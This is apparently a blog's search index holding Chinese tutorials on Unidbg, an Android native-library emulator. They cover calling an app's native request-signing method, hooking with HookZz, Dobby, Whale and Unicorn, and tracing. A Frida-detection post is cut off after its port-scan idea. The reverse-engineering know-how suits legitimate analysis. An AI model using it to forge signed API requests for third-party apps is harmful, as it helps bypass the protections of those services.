&#123; if (backendFactories != null) &#123; for (BackendFactory factory : backendFactories) &#123; Backend backend = factory.newBackend(emulator, is64Bit); if (backend != null) &#123; return backend; &#125; &#125; &#125; // 默认使用 Unicorn后端 return new UnicornBackend(emulator, is64Bit);&#125; BackendFactory 的构造函数通常需要一个 fallbackUnicorn 参数。这个布尔值参数控制在后端创建失败时，是否回退到 Unicorn 后端。如果设为 true，则在当前后端无法成功创建时，Unidbg 会使用 Unicorn 后端作为回退；如果设为 false，则会抛出异常。 根目录etRootDir用于设置虚拟文件系统的根目录，在语义上它对应于 Andorid 的根目录。 123456emulator = AndroidEmulatorBuilder.for32Bit() .setProcessName(executable.getName()) // 设置根目录 .setRootDir(new File(&quot;target/rootfs&quot;)) .addBackendFactory(new DynarmicFactory(true)) .build(); 当读者认为目标 SO 可能会做文件访问与读写操作时，就应该设置根目录，程序对文件的读写会落在这个目录里。 如果不加以设置，Unidbg 会默认在本机临时目录下创建根目录，这会在将项目迁移到其他电脑上时带来不便。所以我们一般会主动设置根目录，并设置为target/rootfs这个相对路径，使得潜在的文件依赖位于在当前 Unidbg 项目里，方便打包处理和迁移。 多线程当 Unidbg 飘红报错Out of Memory时，你需要打开 Unidbg 的多线程模式。 Unidbg 在 Unicorn2 后端上实现了相对完善的多线程处理逻辑，如果读者希望开启多线程，除了要将 Backend 设置为 Unicorn2 外，还需要在模拟器初始化后通过setEnableThreadDispatcher开启多线程调度，以及设置线程切换条件registerEmuCountHook。 12345678emulator = AndroidEmulatorBuilder.for32Bit() .addBackendFactory(new Unicorn2Factory(false)) .setProcessName(&quot;test&quot;) .build();// 设置执行多少条指令切换一次线程emulator.getBackend().registerEmuCountHook(10000);// 开启线程调度器emulator.getSyscallHandler().setEnableThreadDispatcher(true); 多线程是现代操作系统的基本特性之一，程序常常会依赖多线程，那么似乎在理论上，我们总是应该开启多线程逻辑。但事实并非如此，包括 Unidbg、qiling 等一众项目，都是可选开启而不是默认开启多线程逻辑，因为这些模拟器所实现的多线程逻辑都不完备，并不是所有场景里都适用。 在模拟执行相对复杂的样本时，就打开多线程；如果样本难度一般，就不必打开 发起调用接下来发起对s的调用，它是一个实例方法，可以将calls和 Frida Call 的代码逻辑做对照。 123456789101112public String calls()&#123; String arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;; Boolean arg2 = false; String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString(); return ret;&#125;public static void main(String[] args) &#123; xvideo xv = new xvideo(); String result = xv.calls(); System.out.println(&quot;call s result:&quot;+result);&#125; 创建类和实例化s方法是NativeApi类里的实例方法，因此在调用它时，需要先获取NativeApi类，再创建它的实例，最后才是发起调用，比如 Frida Call 代码就遵循这样的原则。Java.use获取类对象，$new()实例化，然后调用s方法。 在 Unidbg 中，尽管它本身并不加载或运行 DEX 文件，但通过一套描述和映射机制，能够支持对 Java 类和实例的模拟操作。这种机制允许 Unidbg 在模拟 Android SO 的过程中，处理涉及 Java 类与对象的方法调用需求。 类创建的机制在 Unidbg 中，Java 类通过 DvmClass 进行模拟。这是一种抽象表示，用于描述 Android 平台上的类结构。Unidbg 提供了方法 vm.resolveClass 来创建 DvmClass 对象。 使用 resolveClass 声明类 在 Unidbg 中，通过vm.resolveClass(className)可以声明一个类名是className的DvmClass。 1DvmClass NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;); 在类名的表述上，用斜杠/或点号.分割都可行，因为resolveClass会替我们做这种替换。（所以主要还是用/分割。） 类的继承与接口 resolveClass 的第二个参数用于声明父类和接口。 Unidbg 并不需要严格模拟整个类的继承结构，很多时候只需要提供形式上的占位即可满足需求。 1234/** * @param interfaceClasses 如果不为空的话，第一个为superClass，其它的为interfaces */DvmClass resolveClass(String className, DvmClass... interfaceClasses); 类实例化的机制在 Unidbg 中，通过 DvmClass.newObject 方法可以创建一个 DvmObject 对象。这种对象只是形式上的表示，并不包含真实的实例逻辑。 使用 newObject 创建实例 方法原型： 1DvmObject&lt;?&gt; newObject(Object value); 创建一个形式上的对象，并返回 DvmObject。 参数 value 只是一个占位值，与真实的构造函数参数无关。 12DvmClass NativeApi = vm.resolveClass(&quot;com/weibo/xvideo/NativeApi&quot;);DvmObject&lt;?&gt; nativeApi = NativeApi.newObject(null); 创建实例的特点 Unidbg 不需要为对象提供完整的实现逻辑，只需描述程序实际使用的部分即可。这种“按需补充”机制简化了模拟的复杂度： 如果程序调用对象的某个方法，只需模拟该方法。不用管其他的部分。 如果程序访问某个属性，只需描述该属性。不用管其他的部分。 通过NativeApi.newObject(null)创建实例后，接下来就是发起函数调用。 123456public String calls()&#123; String arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;; Boolean arg2 = false; String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString(); return ret;&#125; 调用Unidbg 提供了以下调用方法系列，根据方法类型和返回值类型进行选择： 实例方法调用： callJniMethodObject：返回值为对象。 callJniMethodInt：返回值为 int。 callJniMethodBoolean：返回值为布尔值。 其他返回值类型（如 float、double 等）对应相应方法。 静态方法调用： callStaticJniMethodObject：返回值为对象。 callStaticJniMethodInt：返回值为 int。 其他类型同上。 我们想对s发起调用，因为它的返回值是字符串，是对象，所以用callJniMethodObject 接下来看看方法的具体参数，参数 1 是模拟器实例，参数 2 是方法签名，接着是可变参数，用于传入调用方法的参数。 123String arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;;Boolean arg2 = false;String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString(); 这里方法签名填入了s([BZ)Ljava/lang/String;，直接填入s会报错，提示无法找到方法。 如果目标函数是动态加载的，则参数 2 必须是方法签名；如果目标函数是静态加载的，那么直接用传入函数名即可，不需要写方法签名。 如果目标函数采用动态绑定，那么在 Undibg 的 JNI_OnLoad 执行流中找到RegisterNative日志即可看到对应的方法签名。 也可以将 JADX 中切换到 Smali 展示模式，找到对应方法即可看到方法签名。 参数传递123456public String calls()&#123; String arg1 = &quot;aid=01A-khBWIm48A079Pz_DMW6PyZR8uyTumcCNm4e8awxyC2ANU.&amp;cfrom=28B5295010&amp;cuid=5999578300&amp;noncestr=46274W9279Hr1X49A5X058z7ZVz024&amp;platform=ANDROID&amp;timestamp=1621437643609&amp;ua=Xiaomi-MIX2S__oasis__3.5.8__Android__Android10&amp;version=3.5.8&amp;vid=1019013594003&amp;wm=20004_90024&quot;; Boolean arg2 = false; String ret = NativeApi.newObject(null).callJniMethodObject(emulator, &quot;s([BZ)Ljava/lang/String;&quot;, arg1.getBytes(StandardCharsets.UTF_8), arg2).getValue().toString(); return ret;&#125; 参数 1 是字符串，参数 2 是布尔值，直接传递即可，不需要做其他处理，两大类参数都可以直接传递。 基本类型直接传递，int、long、boolean、double 等。 下面几种对象类型也可以直接传递 String byte 数组 short 数组 int 数组 float 数组 double 数组 Enum 枚举类型 除此之外还有许多种可能的参数，比如字符串数组、二维数组、Android Context&#x2F;Application、HashMap 等等，在大体上遵循两类处理办法。 如果是 JDK 中包含的类库和方法，比如二维数组、字符串数组、HashMap 等等，直接构造然后使用ProxyDvmObject.createObject(vm, obj);构造出对象。除此之外比如 Okhttp3 之类的第三方类库，导入到本地环境里，也可以使用这个办法。 如果是 JDK 中无法包含的类库，比如 Android FrameWork 以及样本自定义的类库，通过resolveClass(className).newObject处理，就像本节的NativeApi那样处理。","categories":[],"tags":[],"keywords":[]},{"title":"unidbg初探","slug":"unidbg初探","date":"2024-12-21T06:48:59.000Z","updated":"2024-12-22T14:35:47.026Z","comments":true,"path":"2024/12/21/unidbg初探/","link":"","permalink":"http://example.com/2024/12/21/unidbg%E5%88%9D%E6%8E%A2/","excerpt":"","text":"介绍项目地址：zhkl0228&#x2F;unidbg UniDbg 是一个开源的基于 Unicorn 的 Android Native 调试框架，专注于仿真 Android Native 层的动态库（如 .so 文件）和调用其内部方法。UniDbg 结合了 Unicorn 的指令仿真能力，封装了一套高层次的 API UnicornUnicorn 是一个强大的开源 CPU 仿真框架，它支持多种架构的指令集模拟，允许用户在多种平台上仿真不同架构的代码。它基于更底层的 QEMU，但封装了更简洁易用的接口 UniDbg 的特点 基于 Unicorn 的轻量仿真： 使用 Unicorn 引擎进行指令仿真，支持多种 CPU 架构（如 ARM、ARM64 等）。 只模拟 Native 层，不需要完整的 Android 系统运行环境。 Android 系统接口模拟： 内置了许多 Android 系统调用的仿真（如 JNIEnv、libc.so、libandroid_runtime.so）。 模拟常用的系统函数（如 gettimeofday、dlopen、mmap 等）。 高效的动态库加载： 支持直接加载 .so 文件，并调用其导出的方法。 自动解析 ELF 格式文件的符号表和重定位。 动态调试： 支持 hook Native 方法，拦截函数调用并查看参数和返回值。 支持断点设置、寄存器查看、内存访问等调试功能。 跨平台支持： UniDbg 是一个基于 Java 的框架，可以在多种平台上运行。 逆向工程辅助： 专为逆向工程设计，支持快速仿真加密函数、动态分析 Native 层逻辑。 扩展性强： 可以通过自定义 Hook、模拟环境等方式扩展其功能。 指令集+1在 ARM 架构中，函数地址是否需要 +1 通常与 Thumb 指令集 有关。在 ARM 和 Thumb 指令集中，有以下关键点需要注意： ARM 与 Thumb 指令集： ARM 指令是固定 32 位宽度，地址必须是 4 字节对齐。 Thumb 指令是 16 位宽度，地址可以是 2 字节对齐。 指令集的切换（Thumb 模式标志位）： ARM 指令集和 Thumb 指令集的切换通过地址最低位是否设置为 1来指示： 最低位为 0：ARM 模式。 最低位为 1：Thumb 模式。 例如，在调用函数时，如果最低位为 1，表示调用的是 Thumb 模式函数。 +1 的问题： 在传统动态链接或手动调试时，如果要调用 Thumb 模式的函数，需要在获取的函数地址基础上手动加 1。 这是因为程序通常返回的是实际的函数入口地址，而不是带有 Thumb 模式标志的地址。 unidbg入门用例基本框架unidbg-master\\unidbg-android\\src\\test\\java\\com\\bytedance\\frameworks\\core\\encrypt 123456789101112131415161718TTEncrypt(boolean logging) &#123; this.logging = logging; emulator = AndroidEmulatorBuilder.for32Bit()//32bit .setProcessName(&quot;com.qidian.dldl.official&quot;) .addBackendFactory(new Unicorn2Factory(true)) .build(); // 创建模拟器实例，要模拟32位或者64位，在这里区分 final Memory memory = emulator.getMemory(); // 模拟器的内存操作接口 memory.setLibraryResolver(new AndroidResolver(23)); // 设置系统类库解析 vm = emulator.createDalvikVM(); // 创建Android虚拟机 vm.setVerbose(logging); // 设置是否打印Jni调用细节 DalvikModule dm = vm.loadLibrary(new File(&quot;unidbg-android/src/test/resources/example_binaries/libttEncrypt.so&quot;), false); // 加载libttEncrypt.so到unicorn虚拟内存，加载成功以后会默认调用init_array等函数 dm.callJNI_OnLoad(emulator); // 手动执行JNI_OnLoad函数 module = dm.getModule(); // 加载好的libttEncrypt.so对应为一个模块 // 加载目标类，相当于findClass TTEncryptUtils = vm.resolveClass(&quot;com/bytedance/frameworks/core/encrypt/TTEncryptUtils&quot;); &#125; unidbg函数emulatorUnidbg 的 Emulator 是一个高层抽象，封装了 CPU 仿真（基于 Unicorn）、内存管理、动态库加载、系统调用等功能， 12345678910111213141516171819202122232425262728293031323334353637AndroidEmulator emulator = AndroidEmulatorBuilder //指定32位CPU .for32Bit() //添加后端，推荐使用Dynarmic，运行速度快，但并不支持某些新特性 .addBackendFactory(new DynarmicFactory(true)) //指定进程名，推荐以安卓包名做进程名 .setProcessName(&quot;com.github.unidbg&quot;) //设置根路径 .setRootDir(new File(&quot;target/rootfs/default&quot;)) //生成AndroidEmulator实例 .build();//获取内存操作接口Memory memory = emulator.getMemory();//获取进程pidint pid = emulator.getPid();//创建虚拟机VM dalvikVM = emulator.createDalvikVM();//创建虚拟机并指定APK文件VM dalvikVM = emulator.createDalvikVM(new File(&quot;apk file path&quot;));//获取已创建的虚拟机VM dalvikVM = emulator.getDalvikVM();//显示当前寄存器状态 可指定寄存器emulator.showRegs();//获取后端CPUBackend backend = emulator.getBackend();//获取进程名String processName = emulator.getProcessName();//获取寄存器RegisterContext context = emulator.getContext();//Trace读内存emulator.traceRead(1,0);//Trace写内润emulator.traceWrite(1,0);//Trace汇编emulator.traceCode(1,0);//是否正在运行boolean running = emulator.isRunning(); Memory操作12345678910111213141516//获取内存操作接口Memory memory = emulator.getMemory();//指定Android SDK 版本，目前支持19和23两个版本memory.setLibraryResolver(new AndroidResolver(23));//拿到一个指针，指向内存地址，通过该指针可操作内存UnidbgPointer pointer = memory.pointer(0x4000000);//获取当前内存映射情况Collection&lt;MemoryMap&gt; memoryMap = memory.getMemoryMap();//根据模块名来拿到某个模块Module module = memory.findModule(&quot;module name&quot;);//根据地址拿到某个模块Module module = memory.findModuleByAddress(0x40000000); VM操作1234567891011121314151617181920212223242526//推荐指定APK文件，Unidbg会自动做许多固定的操作VM vm = emulator.createDalvikVM(new File(&quot;apk file path&quot;));//是否输出JNI运行日志vm.setVerbose(true);//加载SO模块 参数二设置是否自动调用init函数DalvikModule dalvikModule = vm.loadLibrary(new File(&quot;so file path&quot;), true);//设置JNI交互接口 参数需实现Jni接口，推荐使用this继承AbstractJnivm.setJni(this);//获取JNIEnv指针，可作为参数传递Pointer jniEnv = vm.getJNIEnv();//获取JavaVM指针，可作为参数传递Pointer javaVM = vm.getJavaVM();//调用JNI_OnLoad函数vm.callJNI_OnLoad(emulator,dalvikModule.getModule());//向VM添加全局对象，返回该对象的hash值int hash = vm.addGlobalObject(dvmObj);//获取虚拟机中的对象，参数为该对象的hash值DvmObject&lt;?&gt; object = vm.getObject(hash); CallMethod执行JNI函数 创建一个VM对象，此对象相当于在Java层去调用native函数的类的实例对象 1DvmObject&lt;?&gt; obj = ProxyDvmObject.createObject(vm, this); 注意：Unidbg会根据第二个参数类的包名进行匹配JNI方法，所以此处的this对象所属类的包名应该与目标函数相匹配 使用该对象进行调用JNI方法 1boolean result = obj.callJniMethodBoolean(emulator, &quot;jnitest(Ljava/lang/String;)Z&quot;, str); 参数二是方法的签名，根据参数二找到对应的函数来执行。假设此时的this对象所属类的包名为:com.kanxue.test2，那此时就会调用: 1jboolean Java_com_kanxue_test2_jnitest(JNIEnv *env, jobject thiz, jstring str); 执行任意函数当我们想执行SO中任意函数时，我们也可以通过地址来进行调用 123456789101112131415//获取JNIEnv *Pointer jniEnv = vm.getJNIEnv();//创建jobject对象DvmObject&lt;?&gt; thiz = vm.resolveClass(&quot;com.kanxue.test2&quot;).newObject(null);//准备入参List&lt;Object&gt; args = new ArrayList&lt;&gt;();args.add(jniEnv);args.add(vm.addLocalObject(thiz));args.add(vm.addLocalObject(new StringObject(vm,&quot;XuE&quot;)));//根据地址调用Number[] numbers = module.callFunction(emulator, 0x9180 + 1, args.toArray());System.out.println(numbers[0].intValue()); 当入参为非指针和Number类型，都需要将对象先添加到VM，才能够在VM中使用这些对象 当返回值为对象时，此时的Number为该对象在VM中的hash值，需要通过vm.getObject()将对象取出进行使用，例: 12DvmObject&lt;?&gt; object = vm.getObject(numbers[0].intValue());String result = (String) object.getValue(); 执行返回值由参数指针传递的函数如： 1void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest); 这种函数我们来看一下我们该如何进行主动执行 123456789101112131415161718192021222324String initial = &quot;unidbg&quot;;int initial_length = initial.length();//开辟一块的空间来存放第一个参数MemoryBlock initial_msg = emulator.getMemory().malloc(initial_length+1, false);UnidbgPointer initial_msg_ptr=initial_msg.getPointer();//将参数1写入initial_msg_ptr.write(initial.getBytes());//开辟一块16字节的空间来存放第三个参数MemoryBlock digest = emulator.getMemory().malloc(16, false);UnidbgPointer digest_ptr=digest.getPointer();//准备参数 List&lt;Object&gt; args = new ArrayList&lt;&gt;();args.add(initial_msg);args.add(initial_length);args.add(digest_ptr);//执行module.callFunction(emulator, 0x7A8D + 1, args.toArray());//打印结果Inspector.inspect(digest_ptr.getByteArray(0, 0x10), &quot;digest&quot;); unidbg中的HookUnidbg 的 Hook 功能可以分为两大类： 内置的第三方 Hook 框架： Dobby（HookZz）、Whale、xHook 。 基于 Unicorn 的 Hook 机制：Unicorn 提供的底层 Hook 功能，以及 Unidbg 在其基础上封装的 Console Debugger。 HookZzHookZz 现在叫 Dobby，Unidbg 中是 HookZz 和 Dobby 是两个独立的 Hook 库，因为作者认为 HookZz 在 arm32 上支持较好，Dobby 在 arm64 上支持较好。HookZz 是 inline hook 方案，因此可以 Hook Sub_xxx，缺点是短函数可能出 bug，受限于 inline Hook 原理 wrap 1234567891011121314HookZz hook = HookZz.getInstance(emulator);hook.wrap(module.base + 0xC09D, new WrapCallback&lt;RegisterContext&gt;() &#123; @Override public void preCall(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info) &#123; Pointer input = ctx.getPointerArg(0); System.out.println(input.getString(0)); &#125; @Override public void postCall(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info) &#123; Pointer result = ctx.getPointerArg(0); System.out.println(result.getString(0)); &#125;&#125;); replace replace函数的第三个参数enablePostCall是一个Boolean类型，其值表示是否使ReplaceCallback的postCall函数生效。 1234567891011121314HookZz hook = HookZz.getInstance(emulator);hook.replacemodule.findSymbolByName(&quot;&quot;), new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?&gt; emulator, HookContext context, long originFunction) &#123; emulator.getBackend().reg_write(Unicorn.UC_ARM_REG_R0,1); return HookStatus.RET(emulator,context.getLR()); &#125; @Override public void postCall(Emulator&lt;?&gt; emulator, HookContext context) &#123; System.out.println(&quot;postCall!&quot;); super.postCall(emulator, context); &#125;&#125;,true); instrument 12345678HookZz hook = HookZz.getInstance(emulator);hookZz.instrument(module.base + 0x00000F5C + 1, new InstrumentCallback&lt;Arm32RegisterContext&gt;() &#123; // 通过base+offset inline wrap内部函数，在IDA看到为sub_xxx那些 @Override public void dbiCall(Emulator&lt;?&gt; emulator, Arm32RegisterContext ctx, HookEntryInfo info) &#123; System.out.println(&quot;R3=&quot; + ctx.getLongArg(3) + &quot;, R10=0x&quot; + Long.toHexString(ctx.getR10Long()));//打印寄存器 &#125;&#125;); Dobby64位模式下推荐使用Dobby,不支持wrap replace 123456789101112131415Dobby dobby = Dobby.getInstance(emulator);dobby.replace(module.base+0xAC90, new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?&gt; emulator, HookContext context, long originFunction) &#123; Pointer result = context.getPointerArg(0); System.out.println(&quot;input:&quot; + result.getString(0)); return super.onCall(emulator, context, originFunction); &#125; @Override public void postCall(Emulator&lt;?&gt; emulator, HookContext context) &#123; super.postCall(emulator, context); &#125;&#125;,true); XHookXHook 是一个针对 Android 平台 ELF 的 PLT (Procedure Linkage Table) hook 库，即它只能用于 hook 导入函数。符号表函数 12345678910IxHook hook = XHookImpl.getInstance(emulator);hook.register(&quot;libutility.so&quot;, &quot;free&quot;, new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?&gt; emulator, HookContext context, long originFunction) &#123; System.out.println(&quot;free called!&quot;); return HookStatus.RET(emulator,context.getLR()); &#125;&#125;);//使hook生效hook.refresh(); Whale123456789101112131415161718192021222324public void HookByWhale()&#123; IWhale whale = Whale.getInstance(emulator); whale.inlineHookFunction(module.findSymbolByName(&quot;base64_encode&quot;), new ReplaceCallback() &#123; Pointer buffer; @Override public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123; RegisterContext context = emulator.getContext(); Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), &quot;base64 input&quot;); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?&gt; emulator, HookContext context) &#123; System.out.println(&quot;base64 result:&quot;+buffer.getString(0)); &#125; &#125;, true);&#125;/*导入函数hook*/whale.importHookFunction(...);/*method hook*/whale.replace(...); Unicorn Hook如果想对某个函数进行集中的、高强度的、同时又灵活的调试，Unicorn CodeHook 是一个好选择。比如我想查看目标函数第一条指令的 r1，第二条指令的 r2，第三条指令的 r3，类似于这种需求。 hook_add_new 第一个参数是 Hook 回调，我们这里选择 CodeHook，它是逐条指令 Hook，参数 2 是起始地址，参数 3 是结束地址，参数 4 一般填 null。这意味着从起始地址到终止地址这个执行范围内的每条指令，我们都可以在其执行前处理它。 找到目标函数的代码范围 12345678910111213141516171819202122232425public void HookByUnicorn()&#123; long start = module.base+0x97C; long end = module.base+0x97C+0x17A; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; RegisterContext registerContext = emulator.getContext(); if(address == module.base + 0x97C)&#123;// hook的目标地址 int r0 = registerContext.getIntByReg(ArmConst.UC_ARM_REG_R0); System.out.println(&quot;0x97C 处 r0:&quot;+Integer.toHexString(r0)); &#125; &#125; @Override public void onAttach(Unicorn.UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, start, end, null);&#125; SystemPropertyHook为了方便处理应用访问设备属性（例如ro.build.id），Unidbg实现了SystemPropertyHook，使用方法如下： 1234567891011121314151617SystemPropertyHook systemPropertyHook = new SystemPropertyHook(emulator);systemPropertyHook.setPropertyProvider(new SystemPropertyProvider() &#123; @Override public String getProperty(String key) &#123; switch (key)&#123; case &quot;ro.build.id&quot;:&#123; return &quot;get id&quot;; &#125; case &quot;ro.build.version.sdk&quot;:&#123; return &quot;get sdk&quot;; &#125; &#125; return null; &#125;&#125;);//使hook生效memory.addHookListener(systemPropertyHook); 打印函数调用栈12emulator.getUnwinder().unwind();emulator.printStackTrace(); 特性 emulator.printStackTrace() emulator.getUnwinder().unwind() 输出格式 自动格式化打印调用栈 返回调用栈的原始数据（StackFrame 列表） 灵活性 固定格式，不可定制 可自定义解析、过滤或存储 适用场景 快速查看调用栈 深入分析调用栈或定制输出 是否符号化 自动解析符号表 依赖模块符号表 监控内存读写Unidbg 提供了一个 TraceMemory 类，可以轻松实现对指定内存范围的访问跟踪。 示例代码： 1234567891011121314// 定义输出文件String traceFile = &quot;myMonitorFile&quot;;PrintStream traceStream = null;try &#123; traceStream = new PrintStream(new FileOutputStream(traceFile), true);&#125; catch (FileNotFoundException e) &#123; e.printStackTrace(); return;&#125;// 监控模块内存的读写操作，并将信息输出到文件emulator.traceRead(module.base, module.base + module.size).setRedirect(traceStream);emulator.traceWrite(module.base, module.base + module.size).setRedirect(traceStream); 作用： 对指定范围的内存访问进行详细追踪。 自动输出读写行为。 tracetraceCode123456789String traceFile = &quot;myTraceCodeFile&quot;;PrintStream traceStream = null;try &#123; traceStream = new PrintStream(new FileOutputStream(traceFile), true);&#125; catch (FileNotFoundException e) &#123; e.printStackTrace();&#125;//追踪目标库的汇编代码，并将信息输出定向到指定文件中emulator.traceCode(module.base, module.base + module.size).setRedirect(traceStream); 要注意 trace 的时机，如果我们想 trace 从某个函数开始的执行流，那就让 traceCode 早于它执行即可。比如想 trace 从 JNI_OnLoad 开始的目标 SO 执行流，在如下的代码位置添加 trace 即可。 123456DalvikModule dm = vm.loadLibrary(&quot;mx&quot;, true);module = dm.getModule();security = vm.resolveClass(&quot;com/mengxiang/arch/security/MXSecurity&quot;);// traceemulator.traceCode(module.base, module.base + module.size);dm.callJNI_OnLoad(emulator); 如果想到更早的时机开启追踪，即追踪 init_proc、init_array 这些初始化函数的执行情况，那就需要将 traceCode 放到 loadLibrary 之前调用，但此时还没有获取到module对象。因此最正确的处理办法是使用模块监听器，在模块加载的第一时间开始 trace 。 123456789101112memory.addModuleListener(new ModuleListener() &#123; @Override public void onLoaded(Emulator&lt;?&gt; emulator, Module module) &#123; if(module.name.equals(&quot;libmx.so&quot;))&#123; emulator.traceCode(module.base, module.base+module.size); &#125; &#125;&#125;);DalvikModule dm = vm.loadLibrary(&quot;mx&quot;, true);module = dm.getModule();security = vm.resolveClass(&quot;com/mengxiang/arch/security/MXSecurity&quot;);dm.callJNI_OnLoad(emulator); 如果想只 trace 某个函数内的汇编，这里分为两种情况： 只关注某地址处的某一函数调用，而不关注于该函数在别处的调用 12345678.text:000000000000E530 MOV X0, X19.text:000000000000E534 MOV X2, X21.text:000000000000E538 LDR X1, [X8] ; &quot;SHA1&quot;.text:000000000000E53C BL ._Z6digestP7_JNIEnvPKcP11_jbyteArray ; digest(_JNIEnv *,char const*,_jbyteArray *).text:000000000000E540 LDR X8, [X19].text:000000000000E544 MOV X1, X0.text:000000000000E548 LDR X2, [X8,#0x538].text:000000000000E54C B loc_E55C 只关注 0xE53C 处的 digest 函数调用，那么需要在 0xE53C 开始 traceCode，0xE540 处停止 trace。 12345678910111213141516171819public void traceDigest()&#123; long callAddr = module.base + 0xE53C; emulator.attach().addBreakPoint(callAddr, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; traceHook = emulator.traceCode(module.base, module.base+module.size); return true; &#125; &#125;); emulator.attach().addBreakPoint(callAddr + 4, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; traceHook.stopTrace(); return true; &#125; &#125;);&#125; 关注某一函数的所有调用，那么在进入该函数前开始 traceCode，离开该函数停止 trace。 123456789101112131415161718192021222324public void traceDigest()&#123; // digest 函数地址 long callAddr = module.base + 0xd804; emulator.attach().addBreakPoint(callAddr, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; RegisterContext registerContext = emulator.getContext(); // 开启 traceCode traceHook = emulator.traceCode(module.base, module.base+module.size); // 在 digest 函数执行完后的返回地址处下断点，取消 traceCode // 由于返回地址可以是module中任意一点 // 那为什么不在 digest 函数的最后一条指令处结束 traceCode，虽然会损失最后一条指令的 trace,但最后一条指令一般是 ret emulator.attach().addBreakPoint(registerContext.getLR(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?&gt; emulator, long address) &#123; traceHook.stopTrace(); return true; &#125; &#125;); return true; &#125; &#125;);&#125; traceFunctionCall1234567891011// function traceDebugger debugger = emulator.attach();debugger.traceFunctionCall(module, new FunctionCallListener() &#123; @Override public void onCall(Emulator&lt;?&gt; emulator, long callerAddress, long functionAddress) &#123; &#125; @Override public void postCall(Emulator&lt;?&gt; emulator, long callerAddress, long functionAddress, Number[] args) &#123; System.out.println(&quot;onCallFinish caller=&quot; + UnidbgPointer.pointer(emulator, callerAddress) + &quot;, function=&quot; + UnidbgPointer.pointer(emulator, functionAddress)); &#125;&#125;); 日志系统日志系统Unidbg 中使用 Apache 的开源项目 log4j 和 commons-logging 处理日志。Unidbg 的绝大多数代码逻辑都提供了信息展示，但只在DEBUG日志等级下才做输出打印。Unidbg 基于模块去管理输出，想了解哪部分日志，就指定具体的类为 DEBUG 等级。 12345678910import org.apache.log4j.Level;import org.apache.log4j.Logger;public static void main(String[] args) &#123; NetWork nw = new NetWork(); Logger.getLogger(ARM32SyscallHandler.class).setLevel(Level.DEBUG); Logger.getLogger(AndroidSyscallHandler.class).setLevel(Level.DEBUG); String result = nw.callSign(); System.out.println(&quot;call s result:&quot;+result);&#125; 除了常规日志，Unidbg 还有另一套日志输出，主要打印 JNI 、Syscall 调用相关的内容。它和常规日志的输出有重叠，但内容更详细一些。我们通过 vm.setVerbose 开启或关闭它。在一般情况下，我们都会开启这个日志。 虚拟机日志12345678910111213141516public WeiBo() &#123; emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setProcessName(&quot;com.weico.international&quot;) .build(); Memory memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/weibo/sinaInternational.apk&quot;)); vm.setJni(this); // 设置是否打印以 JNI 为主的虚拟机调用细节 vm.setVerbose(false); DalvikModule dm = vm.loadLibrary(&quot;utility&quot;, true); WeiboSecurityUtils = vm.resolveClass(&quot;com/sina/weibo/security/WeiboSecurityUtils&quot;); dm.callJNI_OnLoad(emulator);&#125; 龙哥Unidbg Hook 大全 - Silas","categories":[],"tags":[],"keywords":[]},{"title":"frida检测","slug":"frida检测","date":"2024-12-19T16:00:00.000Z","updated":"2024-12-20T02:50:22.541Z","comments":true,"path":"2024/12/20/frida检测/","link":"","permalink":"http://example.com/2024/12/20/frida%E6%A3%80%E6%B5%8B/","excerpt":"","text":"基于网络的检测检测 Frida 的监听端口Frida 在运行时通常会开启特定的监听端口（默认 27042 和 27043）。可以通过扫描本地端口来检测是否存在这些端口。 12345678910private boolean isFridaPortOpen() &#123; try &#123; Socket socket = new 